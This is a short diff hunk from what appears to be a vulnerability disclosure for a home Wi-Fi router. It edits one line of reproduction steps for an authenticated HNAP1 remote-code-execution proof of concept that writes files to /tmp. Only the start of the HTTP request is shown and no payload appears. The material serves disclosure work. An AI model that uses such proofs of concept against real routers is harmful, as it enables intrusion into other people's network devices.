@@ -16,7 +16,7 @@ Reproduction Steps:
 1. Go to your wi-fi router gateway [i.e: http://192.168.0.1]
 1. login with admin
 1. Send http request with admin cookies,
-1. this POC will create a file /tmp/testrce.php and /tmp/testrce1.php:
+1. this POC will create file /tmp/testrce.php and /tmp/testrce1.php:
 ```
 POST /HNAP1/ HTTP/1.1
 Host: 192.168.0.1
